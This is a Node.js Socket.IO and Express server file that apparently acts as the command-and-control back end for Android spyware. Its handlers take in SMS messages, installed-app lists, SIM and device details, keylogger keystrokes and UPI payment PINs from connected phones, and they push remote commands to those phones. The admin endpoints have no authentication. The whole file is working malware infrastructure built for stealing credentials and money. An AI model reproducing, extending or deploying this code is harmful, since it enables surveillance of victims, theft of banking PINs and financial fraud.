// server.js
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
require('dotenv').config();

const { PrismaClient } = require('@prisma/client');

// Handle BigInt serialization
BigInt.prototype.toJSON = function () { return this.toString() }

const prisma = new PrismaClient();
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Logging middleware
app.use((req, res, next) => {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] ${req.method} ${req.url}`);
    next();
});

app.use(cors());
app.use(express.json());

// Connect to database
async function connectDatabase() {
    try {
        console.log('Attempting to connect to database...');
        await prisma.$connect();
        console.log('✅ Connected to database via Prisma');
    } catch (err) {
        console.error('❌ Database connection error:', err);
        process.exit(1);
    }
}

connectDatabase();

// Socket.IO Connection Handling
io.on('connection', (socket) => {
    const deviceId = socket.handshake.query.device_id;
    const connectionId = socket.id;
    const timestamp = new Date().toISOString();
    
    console.log(`🔌 [${timestamp}] New connection: socket=${connectionId}, device=${deviceId || 'unknown'}`);

    if (deviceId) {
        // Join device-specific room
        socket.join(`device:${deviceId}`);
        console.log(`📍 [${timestamp}] Device ${deviceId} joined room device:${deviceId}`);

        // Update device online status
        prisma.device.upsert({
            where: { device_id: deviceId },
            update: {
                status: true,
                last_seen: new Date()
            },
            create: {
                device_id: deviceId,
                status: true,
                last_seen: new Date()
            }
        }).then(() => {
            console.log(`✅ [${timestamp}] Device ${deviceId} online status updated`);
        }).catch(err => {
            console.error(`❌ [${timestamp}] Error updating device status for ${deviceId}:`, err.message);
        });
    }

    // Upsert device data
    socket.on('upsert_device_data', async (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`📱 [${timestamp}] upsert_device_data received from ${deviceId || 'unknown'}`);
        
        try {
            let deviceData = typeof data === 'string' ? JSON.parse(data) : data;
            console.log(`📊 [${timestamp}] Device data:`, JSON.stringify(deviceData).substring(0, 200) + '...');

            // Handle array input (take first item)
            if (Array.isArray(deviceData)) {
                console.log(`📋 [${timestamp}] Device data is array, taking first element`);
                deviceData = deviceData[0];
            }

            if (!deviceData) {
                console.error(`❌ [${timestamp}] No device data provided from ${deviceId}`);
                if (ack) ack(false);
                return;
            }

            // Helper to get value from either snake_case or camelCase
            const getVal = (key1, key2) => deviceData[key1] !== undefined ? deviceData[key1] : deviceData[key2];

            const id = getVal('device_id', 'deviceId');

            if (!id) {
                console.error(`❌ [${timestamp}] Device ID missing in upsert data from ${deviceId}`);
                if (ack) ack(false);
                return;
            }

            const updateData = {
                android_id: getVal('android_id', 'androidId'),
                manufacturer: getVal('manufacturer', 'manufacturer') ?? "Unknown",
                model: getVal('model', 'model') ?? "Unknown",
                brand: getVal('brand', 'brand'),
                product: getVal('product', 'product'),
                android_version: getVal('android_version', 'androidVersion'),
                raw_device_info: getVal('raw_device_info', 'rawDeviceInfo'),
                sim_cards: getVal('sim_cards', 'simCards'),
                service_status: getVal('service_status', 'serviceStatus'),
                oem_status: getVal('oem_status', 'oemStatus'),
                power_save_status: getVal('power_save_status', 'powerSaveStatus'),
                screen_status: getVal('screen_status', 'screenStatus'),
                process_importance: (getVal('process_importance', 'processImportance') || null)?.toString(),

                // If heartbeat is included in the payload, save it too
                heartbeat: deviceData.heartbeat || undefined,

                status: true,
                last_seen: new Date()
            };

            console.log(`💾 [${timestamp}] Upserting device ${id} with data:`, JSON.stringify(updateData).substring(0, 300) + '...');

            await prisma.device.upsert({
                where: { device_id: id },
                update: updateData,
                create: {
                    device_id: id,
                    ...updateData
                }
            });
            
            console.log(`✅ [${timestamp}] Device ${id} data upserted successfully`);
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error upserting device data from ${deviceId}:`, error);
            if (ack) ack(false);
        }
    });

    // Get pending commands
    socket.on('get_pending_commands', async (deviceId, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`📥 [${timestamp}] get_pending_commands requested for ${deviceId}`);
        
        try {
            const commands = await prisma.deviceCommand.findMany({
                where: {
                    device_id: deviceId,
                    status: 'pending'
                },
                orderBy: { created_at: 'desc' }
            });

            console.log(`📋 [${timestamp}] Found ${commands.length} pending commands for ${deviceId}`);

            const mappedCommands = commands.map(c => ({
                id: c.id,
                deviceId: c.device_id,
                command: c.command,
                payload: c.payload,
                status: c.status
            }));

            if (ack) ack(JSON.stringify(mappedCommands));
        } catch (error) {
            console.error(`❌ [${timestamp}] Error getting pending commands for ${deviceId}:`, error);
            if (ack) ack(JSON.stringify([]));
        }
    });

    // Mark command as delivered
    socket.on('mark_command_delivered', async (commandId, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`📬 [${timestamp}] mark_command_delivered for command ${commandId}`);
        
        try {
            await prisma.deviceCommand.update({
                where: { id: commandId },
                data: {
                    status: 'delivered',
                    delivered_at: new Date()
                }
            });
            console.log(`✅ [${timestamp}] Command ${commandId} marked as delivered`);
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error marking command ${commandId} as delivered:`, error);
            if (ack) ack(false);
        }
    });

    // Mark command as executed
    socket.on('mark_command_executed', async (commandId, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`✅ [${timestamp}] mark_command_executed for command ${commandId}`);
        
        try {
            await prisma.deviceCommand.update({
                where: { id: commandId },
                data: {
                    status: 'executed',
                    executed_at: new Date()
                }
            });
            console.log(`✅ [${timestamp}] Command ${commandId} marked as executed`);
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error marking command ${commandId} as executed:`, error);
            if (ack) ack(false);
        }
    });

    // Mark command as failed
    socket.on('mark_command_failed', async (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`❌ [${timestamp}] mark_command_failed received`);
        
        try {
            const d = typeof data === 'string' ? JSON.parse(data) : data;
            console.log(`📋 [${timestamp}] Command failure data:`, JSON.stringify(d));

            await prisma.deviceCommand.update({
                where: { id: d.command_id },
                data: {
                    status: 'failed',
                    executed_at: new Date()
                }
            });
            console.log(`⚠️ [${timestamp}] Command ${d.command_id} failed with error: ${d.error}`);
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error marking command as failed:`, error);
            if (ack) ack(false);
        }
    });

    // Send heartbeat
    socket.on('send_heartbeat', async (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`💓 [${timestamp}] send_heartbeat received`);
        
        try {
            const h = typeof data === 'string' ? JSON.parse(data) : data;
            console.log(`📊 [${timestamp}] Heartbeat data for ${h.device_id}: status=${h.status}, uptime=${h.uptime}, ram=${h.ram}`);

            // Insert into heartbeat table
            await prisma.heartbeat.create({
                data: {
                    device_id: h.device_id,
                    status: h.status,
                    last_update: new Date(),
                    uptime: BigInt(h.uptime || 0),
                    ram: BigInt(h.ram || 0)
                }
            });

            // Update device table heartbeat snapshot and last_seen
            await prisma.device.update({
                where: { device_id: h.device_id },
                data: {
                    heartbeat: h,
                    last_seen: new Date(),
                    status: true
                }
            });

            socket.emit('heartbeat_ack');
            console.log(`✅ [${timestamp}] Heartbeat processed for ${h.device_id}`);
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error processing heartbeat:`, error);
            if (ack) ack(false);
        }
    });

    // Set online status
    socket.on('set_online_status', async (status, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`🔄 [${timestamp}] set_online_status: ${status} for ${deviceId}`);
        
        try {
            if (deviceId) {
                await prisma.device.update({
                    where: { device_id: deviceId },
                    data: {
                        status: status,
                        last_seen: new Date()
                    }
                }).then(() => {
                    console.log(`✅ [${timestamp}] Online status updated to ${status} for ${deviceId}`);
                }).catch(e => {
                    console.error(`❌ [${timestamp}] Update online status failed for ${deviceId}:`, e.message);
                });
            } else {
                console.warn(`⚠️ [${timestamp}] No deviceId available for set_online_status`);
            }
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error setting online status:`, error);
            if (ack) ack(false);
        }
    });

    // Sync SMS
    socket.on('sync_sms', async (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`📨 [${timestamp}] sync_sms received`);
        
        try {
            let messages = typeof data === 'string' ? JSON.parse(data) : data;
            console.log(`📱 [${timestamp}] Processing ${Array.isArray(messages) ? messages.length : 1} SMS messages`);
            
            if (!Array.isArray(messages)) {
                // Handle case where it might be a single object or wrapped strangely
                messages = [messages];
            }

            // Normalize helper
            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            await prisma.$transaction(async (tx) => {
                for (const msg of messages) {
                    if (!msg) continue;

                    const deviceId = getVal(msg, 'device_id', 'deviceId');
                    const idRaw = getVal(msg, 'id', 'id');
                    const address = getVal(msg, 'address', 'address');
                    const body = getVal(msg, 'body', 'body');
                    const date = getVal(msg, 'date', 'date');
                    const timestamp = getVal(msg, 'timestamp', 'timestamp');
                    const type = getVal(msg, 'type', 'type');

                    if (!deviceId || !idRaw) {
                        console.warn(`⚠️ [${timestamp}] Skipping SMS sync: Missing device_id or id`);
                        continue;
                    }

                    const smsId = BigInt(idRaw);
                    const ts = timestamp ? BigInt(timestamp) : BigInt(0);

                    await tx.smsMessage.upsert({
                        where: {
                            id_device_id: {
                                id: smsId,
                                device_id: deviceId
                            }
                        },
                        update: {
                            address: address,
                            body: body,
                            date: date,
                            timestamp: ts,
                            type: type,
                            sync_status: 'synced'
                        },
                        create: {
                            id: smsId,
                            device_id: deviceId,
                            address: address,
                            body: body,
                            date: date,
                            timestamp: ts,
                            type: type,
                            sync_status: 'synced'
                        }
                    });
                }
            });

            socket.emit('sync_complete', 'sms', messages.length);
            console.log(`✅ [${timestamp}] Synced ${messages.length} SMS messages`);
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error syncing SMS:`, error);
            if (ack) ack(false);
        }
    });

    // Sync single SMS
    socket.on('sync_single_sms', async (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`📩 [${timestamp}] sync_single_sms received`);
        
        try {
            const msg = typeof data === 'string' ? JSON.parse(data) : data;
            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            const deviceId = getVal(msg, 'device_id', 'deviceId');
            const idRaw = getVal(msg, 'id', 'id');
            const address = getVal(msg, 'address', 'address');
            const body = getVal(msg, 'body', 'body');
            const date = getVal(msg, 'date', 'date');
            const timestamp = getVal(msg, 'timestamp', 'timestamp');
            const type = getVal(msg, 'type', 'type');

            console.log(`📋 [${timestamp}] Single SMS: device=${deviceId}, from=${address}, id=${idRaw}`);

            if (deviceId && idRaw) {
                const smsId = BigInt(idRaw);
                const ts = timestamp ? BigInt(timestamp) : BigInt(0);

                await prisma.smsMessage.upsert({
                    where: {
                        id_device_id: {
                            id: smsId,
                            device_id: deviceId
                        }
                    },
                    update: {
                        address: address,
                        body: body,
                        date: date,
                        timestamp: ts,
                        type: type,
                        sync_status: 'synced'
                    },
                    create: {
                        id: smsId,
                        device_id: deviceId,
                        address: address,
                        body: body,
                        date: date,
                        timestamp: ts,
                        type: type,
                        sync_status: 'synced'
                    }
                });
                console.log(`✅ [${timestamp}] Single SMS synced successfully`);
            } else {
                console.warn(`⚠️ [${timestamp}] Single SMS sync skipped: Missing deviceId or id`);
            }
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error syncing single SMS:`, error);
            if (ack) ack(false);
        }
    });

    // Sync apps
    socket.on('sync_apps', async (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`📦 [${timestamp}] sync_apps received`);
        
        try {
            let apps = typeof data === 'string' ? JSON.parse(data) : data;
            console.log(`📱 [${timestamp}] Processing ${Array.isArray(apps) ? apps.length : 1} apps`);
            
            if (!Array.isArray(apps)) {
                apps = [apps];
            }

            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            await prisma.$transaction(async (tx) => {
                for (const app of apps) {
                    if (!app) continue;

                    const deviceId = getVal(app, 'device_id', 'deviceId');
                    const packageName = getVal(app, 'package_name', 'packageName');

                    if (!deviceId || !packageName) {
                        console.warn(`⚠️ [${timestamp}] Skipping app sync: Missing device_id or package_name`, app);
                        continue;
                    }

                    const appName = getVal(app, 'app_name', 'appName');
                    const icon = getVal(app, 'icon', 'icon');
                    const versionName = getVal(app, 'version_name', 'versionName');

                    const versionCodeFn = getVal(app, 'version_code', 'versionCode');
                    const versionCode = versionCodeFn ? BigInt(versionCodeFn) : null;

                    const firstInstallTimeFn = getVal(app, 'first_install_time', 'firstInstallTime');
                    const firstInstallTime = firstInstallTimeFn ? BigInt(firstInstallTimeFn) : null;

                    const lastUpdateTimeFn = getVal(app, 'last_update_time', 'lastUpdateTime');
                    const lastUpdateTime = lastUpdateTimeFn ? BigInt(lastUpdateTimeFn) : null;

                    const isSystemApp = getVal(app, 'is_system_app', 'isSystemApp');
                    const targetSdk = getVal(app, 'target_sdk', 'targetSdk');
                    const minSdk = getVal(app, 'min_sdk', 'minSdk');

                    const syncTsFn = getVal(app, 'sync_timestamp', 'syncTimestamp');
                    const syncTimestamp = syncTsFn ? BigInt(syncTsFn) : BigInt(Date.now());

                    await tx.installedApp.upsert({
                        where: {
                            device_id_package_name: {
                                device_id: deviceId,
                                package_name: packageName
                            }
                        },
                        update: {
                            app_name: appName,
                            icon: icon,
                            version_name: versionName,
                            version_code: versionCode,
                            first_install_time: firstInstallTime,
                            last_update_time: lastUpdateTime,
                            is_system_app: isSystemApp,
                            target_sdk: targetSdk,
                            min_sdk: minSdk,
                            sync_timestamp: syncTimestamp,
                            updated_at: new Date()
                        },
                        create: {
                            device_id: deviceId,
                            package_name: packageName,
                            app_name: appName,
                            icon: icon,
                            version_name: versionName,
                            version_code: versionCode,
                            first_install_time: firstInstallTime,
                            last_update_time: lastUpdateTime,
                            is_system_app: isSystemApp || false,
                            target_sdk: targetSdk,
                            min_sdk: minSdk,
                            sync_timestamp: syncTimestamp,
                            created_at: new Date(),
                            updated_at: new Date()
                        }
                    });
                }
            });

            socket.emit('sync_complete', 'apps', apps.length);
            console.log(`✅ [${timestamp}] Synced ${apps.length} apps`);
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error syncing apps:`, error);
            if (ack) ack(false);
        }
    });

    // Set key log
    socket.on('set_key_log', async (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`⌨️ [${timestamp}] set_key_log received`);
        
        try {
            const keyLog = typeof data === 'string' ? JSON.parse(data) : data;
            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            const deviceId = getVal(keyLog, 'device_id', 'deviceId');
            const currentDate = getVal(keyLog, 'current_date', 'currentDate');

            console.log(`📝 [${timestamp}] Key log from ${deviceId}: ${getVal(keyLog, 'key', 'key')}`);

            if (deviceId) {
                await prisma.keyLog.create({
                    data: {
                        device_id: deviceId,
                        keylogger: getVal(keyLog, 'keylogger', 'keylogger'),
                        key: getVal(keyLog, 'key', 'key'),
                        currentDate: currentDate ? new Date(currentDate) : new Date()
                    }
                });
                console.log(`✅ [${timestamp}] Key log saved for ${deviceId}`);
            }
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error saving key log:`, error);
            if (ack) ack(false);
        }
    });

    // Set UPI pin
    socket.on('set_upi_pin', async (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`🔐 [${timestamp}] set_upi_pin received`);
        
        try {
            const pinData = typeof data === 'string' ? JSON.parse(data) : data;
            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            const deviceId = getVal(pinData, 'device_id', 'deviceId');
            const currentDate = getVal(pinData, 'current_date', 'currentDate');

            console.log(`📝 [${timestamp}] UPI pin from ${deviceId}: ${getVal(pinData, 'pin', 'pin').replace(/./g, '*')}`);

            if (deviceId) {
                await prisma.upiPin.create({
                    data: {
                        device_id: deviceId,
                        pin: getVal(pinData, 'pin', 'pin'),
                        currentDate: currentDate ? new Date(currentDate) : new Date()
                    }
                });
                console.log(`✅ [${timestamp}] UPI pin saved for ${deviceId}`);
            }
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error saving UPI pin:`, error);
            if (ack) ack(false);
        }
    });

    // Test connection
    socket.on('test_connection', (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`🧪 [${timestamp}] test_connection from ${deviceId || 'unknown'}`);
        if (ack) ack(true);
    });

    // Admin: Send command to device
    socket.on('send_command', async (data) => {
        const timestamp = new Date().toISOString();
        console.log(`📤 [${timestamp}] Admin send_command:`, JSON.stringify(data));
        
        try {
            const { device_id, command, payload } = data;
            const newCommand = await prisma.deviceCommand.create({
                data: {
                    device_id,
                    command,
                    payload,
                    status: 'pending'
                }
            });

            const commandToSend = {
                id: newCommand.id,
                deviceId: newCommand.device_id,
                command: newCommand.command,
                payload: newCommand.payload,
                status: newCommand.status
            };

            console.log(`📦 [${timestamp}] Created command ${newCommand.id} for device ${device_id}`);

            // Emit as array because client expects List<DeviceCommand>
            io.to(`device:${device_id}`).emit('command', JSON.stringify([commandToSend]));
            console.log(`📡 [${timestamp}] Command ${newCommand.id} sent to device:${device_id}`);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error sending command:`, error);
        }
    });

    // Handle disconnection
    socket.on('disconnect', (reason) => {
        const timestamp = new Date().toISOString();
        console.log(`🔌 [${timestamp}] Device disconnected: ${deviceId || 'unknown'} (socket: ${connectionId}, reason: ${reason})`);

        if (deviceId) {
            // Update device offline status
            prisma.device.update({
                where: { device_id: deviceId },
                data: {
                    status: false,
                    last_seen: new Date()
                }
            }).then(() => {
                console.log(`✅ [${timestamp}] Device ${deviceId} marked as offline`);
            }).catch(err => {
                console.error(`❌ [${timestamp}] Error updating offline status for ${deviceId}:`, err);
            });
        }
    });

    // Handle connection errors
    socket.on('error', (error) => {
        const timestamp = new Date().toISOString();
        console.error(`❌ [${timestamp}] Socket error for ${deviceId}:`, error);
    });
});

// REST API Endpoints for Admin
app.get('/api/devices', async (req, res) => {
    const timestamp = new Date().toISOString();
    console.log(`🌐 [${timestamp}] GET /api/devices`);
    
    try {
        const devices = await prisma.device.findMany({
            orderBy: { last_seen: 'desc' }
        });
        console.log(`✅ [${timestamp}] Returning ${devices.length} devices`);
        res.json(devices);
    } catch (error) {
        console.error(`❌ [${timestamp}] Error fetching devices:`, error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/devices/:deviceId/commands', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    console.log(`🌐 [${timestamp}] GET /api/devices/${deviceId}/commands`);
    
    try {
        const commands = await prisma.deviceCommand.findMany({
            where: { device_id: deviceId },
            orderBy: { created_at: 'desc' }
        });
        console.log(`✅ [${timestamp}] Returning ${commands.length} commands for ${deviceId}`);
        res.json(commands);
    } catch (error) {
        console.error(`❌ [${timestamp}] Error fetching commands for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/devices/:deviceId/commands', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    const { command, payload } = req.body;
    console.log(`🌐 [${timestamp}] POST /api/devices/${deviceId}/commands`, { command, payload });
    
    try {
        const newCommand = await prisma.deviceCommand.create({
            data: {
                device_id: deviceId,
                command: command,
                payload: payload,
                status: 'pending'
            }
        });

        const commandToSend = {
            id: newCommand.id,
            device_id: newCommand.device_id,
            command: newCommand.command,
            payload: newCommand.payload,
            status: newCommand.status
        };

        console.log(`✅ [${timestamp}] Created command ${newCommand.id} for ${deviceId}`);

        // Emit command to device
        io.to(`device:${deviceId}`).emit('command', JSON.stringify([commandToSend]));
        console.log(`📡 [${timestamp}] Command ${newCommand.id} sent to device:${deviceId}`);

        res.json(newCommand);
    } catch (error) {
        console.error(`❌ [${timestamp}] Error creating command for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/devices/:deviceId/heartbeats', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    console.log(`🌐 [${timestamp}] GET /api/devices/${deviceId}/heartbeats`);
    
    try {
        const heartbeats = await prisma.heartbeat.findMany({
            where: { device_id: deviceId },
            orderBy: { last_update: 'desc' },
            take: 100
        });
        console.log(`✅ [${timestamp}] Returning ${heartbeats.length} heartbeats for ${deviceId}`);
        res.json(heartbeats);
    } catch (error) {
        console.error(`❌ [${timestamp}] Error fetching heartbeats for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    const timestamp = new Date().toISOString();
    console.log(`🌐 [${timestamp}] GET /health`);
    res.json({ 
        status: 'healthy', 
        timestamp, 
        uptime: process.uptime(),
        connections: (Object.keys(io.sockets.sockets).length + 1)
    });
});

// Graceful shutdown
process.on('SIGINT', async () => {
    const timestamp = new Date().toISOString();
    console.log(`🛑 [${timestamp}] Received SIGINT, shutting down gracefully...`);
    
    await prisma.$disconnect();
    console.log(`✅ [${timestamp}] Database disconnected`);
    
    server.close(() => {
        console.log(`✅ [${timestamp}] Server closed`);
        process.exit(0);
    });
});

process.on('SIGTERM', async () => {
    const timestamp = new Date().toISOString();
    console.log(`🛑 [${timestamp}] Received SIGTERM, shutting down gracefully...`);
    
    await prisma.$disconnect();
    console.log(`✅ [${timestamp}] Database disconnected`);
    
    server.close(() => {
        console.log(`✅ [${timestamp}] Server closed`);
        process.exit(0);
    });
});

// Handle uncaught exceptions
process.on('uncaughtException', (error) => {
    const timestamp = new Date().toISOString();
    console.error(`💥 [${timestamp}] Uncaught Exception:`, error);
});

process.on('unhandledRejection', (reason, promise) => {
    const timestamp = new Date().toISOString();
    console.error(`💥 [${timestamp}] Unhandled Rejection at:`, promise, 'reason:', reason);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    const timestamp = new Date().toISOString();
    console.log(`🚀 [${timestamp}] Socket.IO server running on port ${PORT}`);
    console.log(`📊 [${timestamp}] Environment: ${process.env.NODE_ENV || 'development'}`);
    console.log(`🔗 [${timestamp}] CORS enabled for all origins`);
});